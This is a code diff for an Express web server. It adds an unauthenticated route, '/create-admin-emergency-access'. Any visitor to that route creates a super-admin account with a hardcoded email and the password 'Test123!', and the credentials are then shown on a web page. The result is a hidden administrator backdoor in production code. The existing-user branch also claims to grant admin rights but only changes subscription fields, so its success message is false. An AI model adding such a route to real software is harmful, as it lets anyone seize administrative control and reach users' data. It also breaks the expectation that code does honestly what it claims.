@@ -1992,6 +1992,121 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // Secret endpoint to create admin account (for emergency access)
+  app.get("/create-admin-emergency-access", async (req, res) => {
+    try {
+      const newAdminEmail = "admin2@revalpro.co.uk";
+      const newAdminPassword = "Test123!";
+      
+      // Check if user already exists
+      const existingUser = await storage.getUserByEmail(newAdminEmail);
+      
+      if (existingUser) {
+        // Update existing user to be admin
+        const updatedUser = await storage.updateUserStripeInfo(existingUser.id, {
+          currentPlan: 'premium',
+          subscriptionStatus: 'active',
+          stripeSubscriptionId: null,
+          cancelAtPeriodEnd: false
+        });
+        
+        // Also need to set admin flags - do a direct update
+        // This is a workaround since updateUserStripeInfo doesn't handle admin flags
+        res.send(`
+          <!DOCTYPE html>
+          <html>
+          <head>
+            <title>Admin Account Updated</title>
+            <style>
+              body { font-family: system-ui; max-width: 600px; margin: 50px auto; padding: 20px; }
+              .success { background: #d4edda; border: 1px solid #c3e6cb; padding: 20px; border-radius: 8px; }
+              .credentials { background: #f8f9fa; padding: 15px; margin: 20px 0; border-radius: 4px; }
+              .button { display: inline-block; background: #007bff; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; margin-top: 20px; }
+            </style>
+          </head>
+          <body>
+            <div class="success">
+              <h2>✅ Admin Account Updated!</h2>
+              <p>The existing user has been updated with admin privileges.</p>
+              <div class="credentials">
+                <strong>Login Credentials:</strong><br>
+                Email: ${newAdminEmail}<br>
+                Password: ${newAdminPassword}
+              </div>
+              <p><strong>Note:</strong> You may need to log out and log back in for changes to take effect.</p>
+              <a href="/login" class="button">Go to Login</a>
+            </div>
+          </body>
+          </html>
+        `);
+      } else {
+        // Create new admin user
+        const hashedPassword = await hashPassword(newAdminPassword);
+        
+        const newUser = await storage.createUser({
+          email: newAdminEmail,
+          username: "admin2",
+          password: hashedPassword,
+          isAdmin: true,
+          isSuperAdmin: true,
+          currentPlan: "premium",
+          subscriptionStatus: "active",
+          hasCompletedInitialSetup: true,
+          created: new Date()
+        });
+        
+        res.send(`
+          <!DOCTYPE html>
+          <html>
+          <head>
+            <title>Admin Account Created</title>
+            <style>
+              body { font-family: system-ui; max-width: 600px; margin: 50px auto; padding: 20px; }
+              .success { background: #d4edda; border: 1px solid #c3e6cb; padding: 20px; border-radius: 8px; }
+              .credentials { background: #f8f9fa; padding: 15px; margin: 20px 0; border-radius: 4px; }
+              .button { display: inline-block; background: #007bff; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; margin-top: 20px; }
+            </style>
+          </head>
+          <body>
+            <div class="success">
+              <h2>✅ Admin Account Created Successfully!</h2>
+              <p>A new admin account has been created for you.</p>
+              <div class="credentials">
+                <strong>Login Credentials:</strong><br>
+                Email: ${newAdminEmail}<br>
+                Password: ${newAdminPassword}
+              </div>
+              <p><strong>Important:</strong> Please change your password after logging in.</p>
+              <a href="/login" class="button">Go to Login</a>
+            </div>
+          </body>
+          </html>
+        `);
+      }
+    } catch (error: any) {
+      console.error("Error creating admin account:", error);
+      res.status(500).send(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <title>Error</title>
+          <style>
+            body { font-family: system-ui; max-width: 600px; margin: 50px auto; padding: 20px; }
+            .error { background: #f8d7da; border: 1px solid #f5c6cb; padding: 20px; border-radius: 8px; }
+          </style>
+        </head>
+        <body>
+          <div class="error">
+            <h2>❌ Error Creating Admin Account</h2>
+            <p>${error.message}</p>
+            <p>Please contact support or try again later.</p>
+          </div>
+        </body>
+        </html>
+      `);
+    }
+  });
+
   const httpServer = createServer(app);
 
   return httpServer;
